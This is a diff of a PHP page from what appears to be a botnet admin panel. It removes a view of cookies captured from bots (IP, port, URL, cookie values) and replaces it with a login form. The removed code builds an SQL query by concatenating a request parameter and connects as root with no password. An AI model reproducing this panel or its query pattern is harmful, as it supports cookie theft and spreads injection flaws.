@@ -1,40 +1,16 @@
-
 <?php
+
+$header_display = "Login";
+
 session_start();
-$header_display = "View Cookies Detail";
-
 if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
-$db = new mysqli('localhost', 'root', '', 'pbl4_v2');
-if (mysqli_connect_errno()) exit;
-$header_display = "Cookies Detail ";
-
-$IdCookies = "";
-$Ip = "";
-$Port ="";
-$Url = "";
-$CookiesResult = "";
-$Time = "";
-
-if (isset($_REQUEST['IdCookies'])) {
-    $id = $_REQUEST['IdCookies'];
-    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
-    if (mysqli_connect_errno()) exit;
-    $sql = "Select cookies.IdCookies,cookies.Time, cookies.Url,cookies.CookiesResult, bot.Ip, bot.Port from cookies,bot where IdCookies = " . $id . " and bot.Id = cookies.IdBot";
-    $rs = mysqli_query($db, $sql);
-    
-    
-    
-    while ($row = mysqli_fetch_array($rs)) {
-      $IdCookies = $row["IdCookies"];
-      $Ip = $row["Ip"];
-      $Port = $row["Port"];
-      $Url = $row["Url"];
-      $CookiesResult = $row["CookiesResult"];
-      $Time = $row["Time"];
-    }
+    header('Location:listBot.php');
 }
+else
+{
 
-echo '<!DOCTYPE html>
+echo '
+<!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
@@ -128,12 +104,16 @@ echo '<!DOCTYPE html>
       .content {
         display: flex;
         flex-direction: column;
-      
         justify-content: space-between;
         width: 100%;
-        min-height: 80%;
-        height: 82%;
+        min-height: 90%;
         padding: 30px;
+      }
+      .content_form
+      {
+        width: 30%;
+        height: 100%;
+        justify-self: flex-start;
       }
       .content_table {
         width: 100%;
@@ -189,7 +169,7 @@ echo '<!DOCTYPE html>
             outline: none;
             border-radius: 4px;
         }
-         .content_back
+        .content_back
         {
             margin-top:16px;
             color: #00ff00;
@@ -201,6 +181,28 @@ echo '<!DOCTYPE html>
             cursor:pointer;
             align-self: flex-start;
         }
+        .password_error, .username_error{
+            font-size:12px;
+        }
+
+        .form_button{
+            margin-top:4px;
+            background: transparent;
+            color: #00ff00;
+            outline: none;
+            border: 1px solid #00ff00;
+            padding:2px 6px;
+            font-size:16px;
+            border-radius:4px;
+            cursor:pointer;
+
+        }
+        .form_button:hover{
+            background: #00ff00;;
+            color: black; 
+            transition-delay: 0.1s;
+        }
+
     </style>
   </head>
 
@@ -235,60 +237,75 @@ echo '<!DOCTYPE html>
           </ul>
         </div>
         <div class="content">
+        <div class="content_form">
+            <form action="handleLogin.php" onsubmit="return handleSubmit()" name="f1" method="POST" class="content_form-input">
           <div class="content_element">
-            <label class="content_element-label" for="ip">Id</label>
+            <label class="content_element-label" for="username">Username</label>
             <input
               class="content_element-input"
-                value="' . $IdCookies . '"
-              readonly
+                value=""
+                id="username"
+                onchange="handleChange()"
+                name="username"
             />
+             <p class="username_error"></p>
           </div>
           <div class="content_element">
-            <label class="content_element-label" for="ip">Ip : Port</label>
+            <label class="content_element-label" for="password">Password</label>
             <input
               class="content_element-input"
-                value="' . $Ip . ' : ' . $Port . '"
-              readonly
+                value=""
+                type="password"
+                id="password"
+                onchange="handleChange()"
+                name="password"
             />
+            <p class="password_error"></p>
           </div>
-
-          <div class="content_element">
-            <label class="content_element-label" for="ip">Time</label>
-            <input
-              class="content_element-input"
-                value="' . $Time . '"
-              readonly
-            />
-          </div>
-          <div class="content_element">
-            <label class="content_element-label" for="ip">Url</label>
-             <textarea
-              class="content_element-input"
-             readonly
-                rows="2"
-            >' . $Url . '</textarea>
-          </div>
-          <div class="content_element">
-            <label class="content_element-label" for="ip">Cookies</label>
-            <textarea
-              class="content_element-input"
-               readonly
-                rows="8"
-            >' . $CookiesResult . '</textarea>
-          </div>
+          <button class="form_button" type="submit">Login</button>
+        </div>
+          </form>
           <button class="content_back" onclick="history.back()">Go Back</button>
         </div>
-
       </div>
       ';
 include_once("navigate.php");
 
-      echo'
+echo '
     </div>
   </body>
+
+  <script>
+        let password_error = document.querySelector(".password_error");
+        let username_error = document.querySelector(".username_error");
+
+        function handleSubmit() {
+            let username = document.getElementById("username");
+            let password = document.getElementById("password");
+          
+            if (password.value === "" || username.value === "") {
+                if(password.value === "")
+                {
+                    password_error.innerHTML = "Password cannot be empty"
+                }
+                if(username.value === "")
+                {
+                    username_error.innerHTML = "Username cannot be empty"
+                }
+                return false
+            } else {
+                return true
+                //document.f1.submit();
+            }
+        }
+
+        function handleChange() {
+            password_error.innerHTML = "";
+            username_error.innerHTML = "";
+        }
+    </script>
 </html>
+
 ';
-} else {
-  include_once('noLogin.php');
 }
 ?>
